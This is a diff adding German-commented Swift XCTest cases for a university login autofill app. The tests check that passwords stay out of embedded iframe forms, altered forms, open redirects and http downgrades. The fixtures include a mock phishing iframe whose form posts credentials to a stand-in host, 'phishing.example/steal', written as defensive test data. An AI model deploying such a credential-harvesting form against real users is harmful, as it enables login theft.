@@ -506,6 +506,168 @@ final class UniversityLoginAutofillTests: XCTestCase {
         try await waitUntil("filled neu") { log2.events.contains(.filled) }
     }
 
+    // MARK: 231–235 Manipulierte und weitergeleitete Anmeldeseiten
+
+    /// Formular im eingebetteten Rahmen: ueber das DOM des leeren Rahmens (about:blank) gebaut, ohne Navigation – die
+    /// Testumgebung bricht jede weitere Navigation ab (auch srcdoc), es soll nie etwas aus dem Netz kommen
+    static func frameScript(action: String) -> String {
+        """
+        <iframe id="fremd"></iframe>
+        <script>
+        (function () {
+          var d = document.getElementById('fremd').contentDocument;
+          d.body.innerHTML = '<form id="fm1" method="post" action="\(action)">'
+            + '<input id="username" name="username" type="text"><input id="password" name="password" type="password">'
+            + '<button name="submit" type="submit">Anmelden</button></form>';
+        })();
+        </script>
+        """
+    }
+
+    /// Echte Anmeldeseite mit eingebettetem Fremdformular (iframe, gleiche Feldnamen, Ziel auf fremdem Rechner):
+    /// nur das Formular des Hauptrahmens wird vorausgefuellt, das eingebettete bleibt leer; die Seite selbst sieht den
+    /// Kanal der App nicht.
+    static let framedPage = """
+    <!doctype html><html><head><meta charset="utf-8"></head><body>
+    <form id="fm1" method="post" action="login" onsubmit="window.__submitted = (window.__submitted || 0) + 1;">
+    <input id="username" name="username" type="text"><input id="password" name="password" type="password">
+    <button name="submit" type="submit">Anmelden</button></form>
+    \(frameScript(action: "https://phishing.example/steal"))
+    </body></html>
+    """
+
+    /// Seite auf dem Anmeldepfad, deren Formular nur in einem eingebetteten Rahmen steckt
+    static let onlyFramedPage = """
+    <!doctype html><html><head><meta charset="utf-8"></head><body><p>Bitte anmelden</p>
+    \(frameScript(action: "login"))
+    </body></html>
+    """
+
+    private func frameHasPasswordField(_ h: Harness) async throws -> Bool {
+        try await h.js("String(!!(document.getElementById('fremd').contentDocument && document.getElementById('fremd').contentDocument.querySelector('#password')))") == "true"
+    }
+
+    func testEmbeddedForeignFormIsNeverFilled() async throws {
+        store.save(typed, .hildesheim, service: "cas")
+        let (a, log) = try autofill(.hildesheim, "cas")
+        let h = try await harness(a)
+        try await loaded(h, Self.framedPage, Self.casURL)
+        try await waitUntil("filled") { log.events.contains(.filled) }
+        try await waitUntil("eingebetteter Rahmen steht") { try await self.frameHasPasswordField(h) }
+        try await settle()
+        let main = try await h.js("document.getElementById('password').value")
+        XCTAssertEqual(main, "Pw-Test-123", "Hauptrahmen: vorausgefuellt")
+        let frameUser = try await h.js("document.getElementById('fremd').contentDocument.querySelector('#username').value")
+        let framePw = try await h.js("document.getElementById('fremd').contentDocument.querySelector('#password').value")
+        XCTAssertEqual(frameUser, "")
+        XCTAssertEqual(framePw, "", "nie in ein eingebettetes Formular")
+        // der Kanal zur App liegt in einer eigenen Inhaltswelt: fuer Seite und Rahmen unsichtbar
+        let channel = try await h.js("String(typeof (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.uniflowLogin))")
+        XCTAssertEqual(channel, "undefined")
+        let frameChannel = try await h.js("String(typeof (document.getElementById('fremd').contentWindow.webkit && document.getElementById('fremd').contentWindow.webkit.messageHandlers && document.getElementById('fremd').contentWindow.webkit.messageHandlers.uniflowLogin))")
+        XCTAssertEqual(frameChannel, "undefined")
+        XCTAssertFalse(log.events.contains(.rejected))
+        XCTAssertFalse(h.blocked.contains(.formSubmitted), "nichts abgeschickt")
+        let submitted = try await h.js("String(window.__submitted || 0)")
+        XCTAssertEqual(submitted, "0")
+
+        // nur ein eingebettetes Formular: kein "ready", nichts vorausgefuellt, nichts gemerkt
+        let n = log.events.count
+        try await loaded(h, Self.onlyFramedPage, Self.casURL)
+        try await waitUntil("eingebetteter Rahmen steht") { try await self.frameHasPasswordField(h) }
+        try await settle()
+        let onlyPw = try await h.js("document.getElementById('fremd').contentDocument.querySelector('#password').value")
+        XCTAssertEqual(onlyPw, "")
+        XCTAssertEqual(Array(log.events[n...]), [], "Unterrahmen loesen keine Nachricht aus")
+        _ = try await h.js("""
+        (function () { var d = document.getElementById('fremd').contentDocument;
+          d.querySelector('#username').value = 'fremd'; d.querySelector('#password').value = 'fremd-pw';
+          d.getElementById('fm1').requestSubmit(); return 'ok'; })()
+        """)
+        try await settle()
+        XCTAssertEqual(Array(log.events[n...]), [])
+        XCTAssertEqual(store.credential(.hildesheim, service: "cas"), typed, "nichts ueberschrieben")
+    }
+
+    /// 232: geaenderte Seite – ein Passwortfeld, das keins ist (type=text), oder gar keins: kein "ready", nichts
+    /// vorausgefuellt; das Textfeld vor einem echten Passwortfeld zaehlt auch ohne die Selektoren des Profils
+    /// (testUserFieldBeforePasswordIsFound)
+    func testChangedFormWithoutRealPasswordFieldGetsNothing() async throws {
+        store.save(typed, .hildesheim, service: "cas")
+        let (a, log) = try autofill(.hildesheim, "cas")
+        let h = try await harness(a)
+        let textPassword = Self.casPage.replacingOccurrences(of: #"name="password" type="password""#, with: #"name="password" type="text""#)
+        try await loaded(h, textPassword, Self.casURL)
+        try await settle()
+        let v = try await h.js("document.querySelector('#password').value")
+        XCTAssertEqual(v, "", "sichtbares Textfeld wird nie mit dem Passwort befuellt")
+        let u = try await h.js("document.querySelector('#username').value")
+        XCTAssertEqual(u, "")
+        XCTAssertTrue(log.events.isEmpty, "\(log.events)")
+        let noForm = "<!doctype html><html><body><p>Anmeldung zurzeit nicht möglich</p></body></html>"
+        try await loaded(h, noForm, Self.casURL)
+        try await settle()
+        XCTAssertTrue(log.events.isEmpty)
+        // die unveraenderte Seite danach: weiterhin vorausgefuellt
+        try await loaded(h, Self.casPage, Self.casURL)
+        try await waitUntil("filled") { log.events.contains(.filled) }
+    }
+
+    /// 233/234: Weiterleitungen, wie der WKNavigationDelegate der Anmeldeansicht sie meldet. Zwischen den Anmeldezielen
+    /// eines Dienstes (Stud.IP-Login -> WebSSO) bleibt die Ansicht scharf; die Weiterleitung nach der Anmeldung in den
+    /// Dienst entschaerft sie; eine offene Weiterleitung auf einen fremden Rechner mit demselben Pfad ist nie ein Ziel.
+    func testRedirectsBetweenLoginTargetsStayArmedAndLeavingDisarms() throws {
+        let (a, log) = try autofill(.luh, "studip")
+        a.navigationStarts(mainFrame: true, backForward: false)
+        a.navigationResponds(mainFrame: true, url: Self.luhSSOURL)                  // 302 vom Stud.IP-Login zum WebSSO
+        a.navigationCommitted(shownURL: Self.luhSSOURL)
+        XCTAssertEqual(a.documentURL, Self.luhSSOURL)
+        XCTAssertTrue(a.isArmed)
+        XCTAssertTrue(a.service.allows(a.documentURL))
+        // zurueck zum Stud.IP-Login (zweites Ziel desselben Dienstes)
+        a.navigationStarts(mainFrame: true, backForward: false)
+        a.navigationResponds(mainFrame: true, url: Self.studipLoginURL)
+        a.navigationCommitted(shownURL: Self.studipLoginURL)
+        XCTAssertEqual(a.documentURL, Self.studipLoginURL)
+        XCTAssertTrue(a.isArmed)
+        XCTAssertTrue(log.events.isEmpty)
+        // nach der Anmeldung: Stud.IP-Startseite (kein Anmeldeziel) -> entschaerft, fuer den Rest der Ansicht
+        let start = URL(string: "https://studip.uni-hannover.de/dispatch.php/start")!
+        a.navigationStarts(mainFrame: true, backForward: false)
+        a.navigationResponds(mainFrame: true, url: start)
+        a.navigationCommitted(shownURL: start)
+        XCTAssertNil(a.documentURL)
+        XCTAssertFalse(a.isArmed)
+        XCTAssertEqual(log.events, [.disarmed])
+        a.navigationStarts(mainFrame: true, backForward: false)
+        a.navigationResponds(mainFrame: true, url: Self.studipLoginURL)
+        a.navigationCommitted(shownURL: Self.studipLoginURL)
+        XCTAssertFalse(a.isArmed, "einmal verlassen bleibt verlassen")
+
+        // offene Weiterleitung des CAS auf einen fremden Rechner, gleicher Pfad: kein Ziel, nichts entschaerft (nie dort)
+        let (b, log2) = try autofill(.hildesheim, "cas")
+        let foreign = URL(string: "https://phishing.example/sso/login?service=x")!
+        b.navigationStarts(mainFrame: true, backForward: false)
+        b.navigationResponds(mainFrame: true, url: foreign)
+        b.navigationCommitted(shownURL: foreign)
+        XCTAssertEqual(b.documentURL, foreign)
+        XCTAssertFalse(b.service.allows(b.documentURL))
+        XCTAssertTrue(log2.events.isEmpty)
+        // Weiterleitung vom Anmeldepfad auf http (Herabstufung): kein Ziel
+        let http = URL(string: "http://www.uni-hildesheim.de/sso/login")!
+        b.navigationStarts(mainFrame: true, backForward: false)
+        b.navigationResponds(mainFrame: true, url: http)
+        b.navigationCommitted(shownURL: http)
+        XCTAssertFalse(b.service.allows(b.documentURL))
+        // Anmeldeseite, danach per Skript auf den Anmeldepfad eines anderen Dienstes derselben Hochschule gewechselt
+        // (QIS der LUH): die Ansicht gehoert zum Dienst, das Ziel nicht
+        let (c, _) = try autofill(.luh, "studip")
+        c.navigationStarts(mainFrame: true, backForward: false)
+        c.navigationResponds(mainFrame: true, url: Self.qisURL)
+        c.navigationCommitted(shownURL: Self.qisURL)
+        XCTAssertFalse(c.service.allows(c.documentURL), "QIS ist kein Ziel des Stud.IP-Dienstes")
+    }
+
     // MARK: QIS der LUH mit der LUH-ID aus Stud.IP (wie am PC)
 
     static let qisURL = URL(string: "https://qis.verwaltung.uni-hannover.de/qisserver/rds?state=user&type=0")!
